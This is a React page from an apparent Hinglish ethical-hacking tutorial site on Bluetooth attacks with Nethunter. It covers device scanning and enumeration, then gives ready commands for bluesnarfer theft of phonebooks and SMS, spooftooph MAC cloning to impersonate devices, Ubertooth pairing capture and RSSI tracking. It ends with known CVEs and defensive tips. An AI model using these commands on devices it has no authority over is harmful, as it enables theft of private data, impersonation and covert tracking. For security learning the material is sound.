import TutorialLayout from '../components/TutorialLayout'
import CodeBlock from '../components/CodeBlock'

export default function BluetoothHacking() {
  return (
    <TutorialLayout
      title="Bluetooth Hacking"
      subtitle="Nethunter se Bluetooth security testing seekhein"
      icon="🔵"
      prev={{ to: '/wifi', label: 'WiFi Hacking' }}
      next={{ to: '/payloads', label: 'Payloads & Attacks' }}
    >
      <h2>Bluetooth Security Kya Hai?</h2>
      <p>
        Bluetooth aaj ke samay mein har jagah hai — headphones, smartwatches, fitness bands, car systems, smart home devices, keyboards, mice, speakers — sab mein Bluetooth hota hai. Lekin bahut kam log jaante hain ki Bluetooth mein bhi security vulnerabilities hoti hain jinka faayda uthaya ja sakta hai. Bluetooth hacking ka matlab hai ki aap Bluetooth devices ki security ko test karte hain taaki vulnerabilities mil sakein aur unhe fix kiya ja sake.
      </p>
      <p>
        Nethunter mein kai saare tools hain jo aapko Bluetooth security testing mein help karte hain. Aap devices scan kar sakte hain, services enumerate kar sakte hain, BLE (Bluetooth Low Energy) devices ke saath interact kar sakte hain, aur known vulnerabilities test kar sakte hain. Yeh sab kuch ethical hacking ke framework mein hota hai — sirf educational aur authorized testing ke liye.
      </p>
      <p>
        Bluetooth do tarah ka hota hai — <strong>Classic Bluetooth (BR/EDR)</strong> jo audio streaming, file transfer, aur purane devices mein use hota hai, aur <strong>Bluetooth Low Energy (BLE)</strong> jo fitness trackers, smartwatches, IoT devices, aur beacons mein use hota hai. Dono ki apni security challenges hain aur dono ko alag tarike se test kiya jaata hai.
      </p>

      <div className="info-box mb-6">
        <strong>💡 Do Tarah ke Bluetooth:</strong>
        <ul className="mt-2">
          <li><strong>Classic Bluetooth (BR/EDR):</strong> Audio devices (headphones, speakers), file transfer, older accessories mein use hota hai. Speed zyada hai lekin power consumption bhi zyada hai.</li>
          <li><strong>Bluetooth Low Energy (BLE):</strong> IoT devices, fitness trackers, smartwatches, beacons mein use hota hai. Bahut kam power use karta hai isliye battery-operated devices mein popular hai. Security protocols different hain Classic se.</li>
        </ul>
      </div>

      <h2>Step 1: Bluetooth Reconnaissance (Devices Dhundhna)</h2>
      <p>
        Bluetooth hacking ka pehla step hai aas paas ke Bluetooth devices dhundhna aur unki information gather karna. Isse reconnaissance kehte hain. Aapko pata chalega ki kaunse devices hain, unka naam kya hai, kya services offer kar rahe hain, aur kya vulnerabilities ho sakti hain.
      </p>

      <CodeBlock
        title="Bluetooth Adapter Setup Karein"
        code={`# Sabse pehle check karein ki Bluetooth adapter hai:
hciconfig

# Agar kuch nahi dikhta toh Bluetooth adapter detect nahi ho raha
# Nethunter mein usually hci0 hota hai

# Adapter enable karein:
sudo hciconfig hci0 up

# Adapter ki detail information dekhein:
hciconfig -a
# Yeh adapter ka naam, MAC address, class, aur capabilities dikhata hai

# Agar adapter class "0x000000" hai toh shayad disabled hai
# dobara enable karein ya device restart karein`}
      />

      <CodeBlock
        title="Aas Paas ke Devices Scan Karein"
        code={`# Classic Bluetooth devices scan karein:
hcitool scan
# Scanning 10 seconds tak chalegi
# Results mein device ka MAC address aur naam dikhega

# BLE (Bluetooth Low Energy) devices scan karein:
hcitool lescan
# Yeh continuously scan karta hai (Ctrl+C se band karein)
# BLE devices ka MAC aur naam dikhega

# Detailed scan with RSSI (signal strength):
hcitool inq
# Har device ka clock aur offset bhi dikhega

# Advanced scanning ke liye btscanner use karein:
sudo apt install btscanner
sudo btscanner

# btscanner ke UI mein:
# 'i' dabayein inquiry scan ke liye
# Device select karein details dekhne ke liye
# Name, Class, Manufacturer sab dikhega`}
      />

      <h2>Step 2: Device Enumeration (Detail Information)</h2>
      <p>
        Jab ek target device mil jaaye toh uski detailed information nikalni hoti hai. Isse enumeration kehte hain. Isme pata chalta hai ki device kya kya services offer kar raha hai — file transfer, audio, serial port, OBEX, aur bahut kuch. Services ki information se aap samajh sakte hain ki device kaise kaam karta hai aur kya attack surface hai.
      </p>

      <CodeBlock
        title="SDP Service Discovery"
        code={`# Target device ki sab services discover karein:
sdptool browse AA:BB:CC:DD:EE:FF

# Yeh device ki sab Bluetooth services dikhata hai:
# - Audio Sink (headphones/speakers)
# - Audio Source
# - File Transfer (OBEX FTP)
# - Object Push (OBEX OPP)
# - Serial Port (SPP)
# - Human Interface Device (HID - keyboard/mouse)
# - Health Device Profile
# - Aur bahut saari services

# Tree format mein services dekhein:
sdptool browse --tree AA:BB:CC:DD:EE:FF

# Specific service search karein:
sdptool search --bdaddr AA:BB:CC:DD:EE:FF SP
# SP = Serial Port service search

# Device ka naam pata karein:
hcitool name AA:BB:CC:DD:EE:FF`}
      />

      <h2>Step 3: BLE Scanning with Bettercap</h2>
      <p>
        BLE devices ki reconnaissance ke liye Bettercap sabse powerful tool hai. Bettercap ek Swiss Army knife hai network attacks ke liye — WiFi, BLE, aur Ethernet sab support karta hai. BLE scanning mein aapko devices ke advertising data, services (UUIDs), aur signal strength milti hai.
      </p>

      <CodeBlock
        title="BLE Reconnaissance with Bettercap"
        code={`# Bettercap install karein (agar nahi hai):
sudo apt install bettercap

# Bettercap start karein:
sudo bettercap

# Bettercap console mein commands:
# BLE discovery enable karein:
ble.recon on

# Discovered BLE devices dekhein:
ble.show

# Har device ke liye yeh information dikhegi:
# - MAC address
# - RSSI (signal strength — zyada number = zyada paas)
# - Manufacturer name
# - Advertised services (UUIDs)
# - Connectable ya non-connectable

# Specific device ki details:
ble.show AA:BB:CC:DD:EE:FF

# BLE events monitor karein:
set ble.show.sort rssi
# Signal strength ke hisaab se sort karega`}
      />

      <h2>Step 4: Bluetooth Attacks</h2>
      <p>
        Ab hum kuch actual attacks dekhenge jo Nethunter par possible hain. Yaad rakhein — yeh sab sirf authorized testing ke liye hai. Bina permission ke kisi ke device par attack karna illegal hai.
      </p>

      <h3>Bluesnarfer (Data Theft via OBEX)</h3>
      <p>
        Bluesnarfer ek tool hai jo vulnerable Bluetooth devices se data read kar sakta hai. Yeh OBEX (Object Exchange) service ka faayda uthata hai jo kuch purane devices par bina authentication ke accessible hota hai. Agar device vulnerable hai toh aap phonebook, SMS messages, aur call logs read kar sakte hain.
      </p>
      <CodeBlock
        title="Bluesnarfer se Data Read Karein"
        code={`# Bluesnarfer se phonebook read karein:
sudo bluesnarfer -r 1-100 -b AA:BB:CC:DD:EE:FF
# Contact entries 1 se 100 tak read karega

# SMS messages read karein:
sudo bluesnarfer -s all -b AA:BB:CC:DD:EE:FF
# Sab SMS messages dikhayega

# Device ki information:
sudo bluesnarfer -i AA:BB:CC:DD:EE:FF

# Note: Yeh attack sirf OBEX vulnerability wale devices par kaam karta hai
# Modern devices mein yeh vulnerability fix ho chuki hai
# Lekin purane phones aur kuch IoT devices abhi bhi vulnerable ho sakte hain`}
      />

      <h3>Spooftooph (MAC Address Spoofing)</h3>
      <p>
        MAC spoofing ka matlab hai apne Bluetooth adapter ka MAC address badalna. Yeh useful hai jab aap kisi device ko impersonate karna chahte ho ya apni identity chupani ho. Spooftooph se aap kisi bhi device ka MAC address copy kar sakte hain.
      </p>
      <CodeBlock
        title="MAC Address Spoof Karein"
        code={`# Devices scan karein:
sudo spooftooph -s

# Kisi device ka MAC aur naam clone karein:
sudo spooftooph -i hci0 -A AA:BB:CC:DD:EE:FF -n "Target Headphones"

# Random MAC address set karein:
sudo spooftooph -i hci0 -R

# Original MAC address wapas set karein:
sudo spooftooph -i hci0 -A ORIGINAL:MAC:ADDR

# MAC spoofing se aap:
# - Apni identity hide kar sakte hain
# - Kisi device ko impersonate kar sakte hain
# - MAC-based access controls bypass kar sakte hain`}
      />

      <h3>BLE Sniffing with Ubertooth</h3>
      <p>
        Ubertooth One ek special USB hardware device hai jo BLE communication ko sniff kar sakta hai. Software se BLE ka full protocol stack capture karna mushkil hai kyunki BLE ka hardware layer complex hai. Ubertooth yeh kaam karta hai lekin isse alag se kharidna padta hai (lagbhag $120).
      </p>
      <CodeBlock
        title="BLE Sniffing with Ubertooth"
        code={`# Ubertooth One USB mein lagayein

# BLE advertisements capture karein:
ubertooth-btle -f

# Specific connection follow karein:
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF

# Capture file mein save karein:
ubertooth-btle -f -c capture.pcap

# Wireshark mein open karein analyze karne ke liye:
wireshark capture.pcap

# Ubertooth se aap:
# - BLE pairing process capture kar sakte hain
# - Encryption keys negotiate hote waqt dekh sakte hain
# - BLE beacon data analyze kar sakte hain
# - Hidden BLE devices discover kar sakte hain`}
      />

      <h2>Step 5: BLE Device Tracking aur Analysis</h2>
      <p>
        BLE devices ko track karna possible hai unke signal strength (RSSI) ke through. Jitna device paas hoga signal utna strong hoga. Yeh technique useful hai agar aap kisi BLE device ka location track karna chahte ho ya samajhna chahte ho ki BLE beacons kaise kaam karte hain.
      </p>

      <CodeBlock
        title="BLE Device Tracking"
        code={`# Bettercap se BLE devices track karein:
sudo bettercap -eval "ble.recon on; events.stream off"

# RSSI values monitor karein:
# -30 dBm = bahut paas (1-2 meter)
# -60 dBm = medium distance (5-10 meter)
# -90 dBm = bahut door (30+ meter)

# BLE beacon data analyze karein:
# iBeacon, Eddystone, ya custom beacons ka data dekhein
# Beacon UUID, Major, Minor values nikalein

# BLE tracking se samjhein ki:
# - Devices kahan hain relative to aap
# - Kitne devices hain area mein
# - Devices ka behavior pattern kya hai`}
      />

      <h2>Bluetooth Security Vulnerabilities</h2>
      <p>
        Bluetooth mein kai known vulnerabilities discover hue hain jo different devices ko affect karti hain. In vulnerabilities ke baare mein jaanna zaroori hai taaki aap samajh sakein ki Bluetooth security kitni important hai:
      </p>
      <div className="space-y-4">
        <div className="glass-card p-4">
          <h4 className="text-neon-red font-bold">BlueBorne (CVE-2017-0781-0785)</h4>
          <p className="text-gray-400 text-sm mt-1">
            Yeh vulnerabilities ka ek set hai jo Android, iOS, Windows, aur Linux ko affect karta hai. In vulnerabilities se attacker ko bina pairing ke remote code execution mil sakta hai — matlab attacker aapke phone ko hack kar sakta hai sirf Bluetooth on hone se, koi click ya pairing ki zaroorat nahi. Modern devices mein patch ho chuki hai lekin purane devices abhi bhi vulnerable ho sakte hain.
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-red font-bold">KNOB Attack (CVE-2019-9506)</h4>
          <p className="text-gray-400 text-sm mt-1">
            Key Negotiation of Bluetooth attack. Yeh attack encryption key negotiation mein kami ka faayda uthata hai. Bluetooth connection mein encryption key ka size negotiate hota hai — KNOB attack force karta hai ki chhota (1 byte) key use ho, jise brute force se crack karna aasan ho jaata hai. Isse attacker Bluetooth traffic intercept kar sakta hai.
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-red font-bold">BLURtooth (CVE-2020-15802)</h4>
          <p className="text-gray-400 text-sm mt-1">
            Yeh vulnerability Bluetooth 4.0 se 5.0 wale devices mein hai. Attackers authentication keys overwrite kar sakte hain (CTKD — Cross-Transport Key Derivation ka misuse karke). Isse MITM (Man-in-the-Middle) attacks possible hain jahan attacker beech mein baithkar communication read aur modify kar sakta hai.
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-red font-bold">BLESA (CVE-2020-10069)</h4>
          <p className="text-gray-400 text-sm mt-1">
            Bluetooth Low Energy Spoofing Attack. Jab BLE device reconnect hota hai toh proper authentication nahi hota, jisse attacker spoofed device banakar malicious data bhej sakta hai. Fitness trackers aur health devices mein yeh bahut dangerous ho sakta hai.
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-neon-red font-bold">BrakTooth (CVE-2021-28139)</h4>
          <p className="text-gray-400 text-sm mt-1">
            Classic Bluetooth ka LMP (Link Manager Protocol) vulnerability set. Bahut saare Bluetooth chipsets (Intel, Qualcomm, Texas Instruments) affect hote hain. DoS attacks aur potentially code execution possible hai. Bluetooth firmware update zaroori hai.
          </p>
        </div>
      </div>

      <h2>Apna Bluetooth Kaise Secure Karein</h2>
      <p>
        Ab jab aap jaante hain ki Bluetooth mein kya vulnerabilities ho sakti hain, toh yeh bhi jaan lein ki apne devices ko kaise secure karein:
      </p>
      <ul>
        <li><strong>Bluetooth band rakhein jab use na karein:</strong> Zaroorat nahi hai toh Bluetooth off rakhein. Isse attack surface kam hota hai.</li>
        <li><strong>"Non-discoverable" mode use karein:</strong> Jab Bluetooth on ho toh discoverable mode band rakhein taaki unknown devices aapka phone na dhundh sakein.</li>
        <li><strong>Pairing requests carefully accept karein:</strong> Agar koi unknown device pairing request bheje toh accept mat karein.</li>
        <li><strong>Firmware update rakhein:</strong> Bluetooth devices ka firmware regularly update karein taaki security patches mil sakein.</li>
        <li><strong>Purane devices use na karein:</strong> Bahut purane Bluetooth devices mein known vulnerabilities hoti hain.</li>
        <li><strong>BLE devices ka data encrypt ho:</strong> Agar aap BLE device develop kar rahe hain toh hamesha encryption use karein.</li>
      </ul>

      <h2>Bluetooth Tools Summary</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Tool</th>
              <th className="text-left py-2 px-3 text-neon-green">Kya Karta Hai</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hcitool</td><td>Bluetooth scanning aur device info</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">sdptool</td><td>Service discovery — device ki services list karta hai</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">bettercap</td><td>BLE reconnaissance aur network attacks</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">bluesnarfer</td><td>OBEX se data theft — contacts, SMS read</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">spooftooph</td><td>MAC address spoofing — identity change</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ubertooth</td><td>BLE sniffing — hardware level capture</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">gattacker</td><td>BLE MITM framework — beech mein data intercept</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">btscanner</td><td>Interactive Bluetooth scanner with UI</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">crackle</td><td>BLE encryption crack — pairing data se key nikalta hai</td></tr>
          </tbody>
        </table>
      </div>
    </TutorialLayout>
  )
}
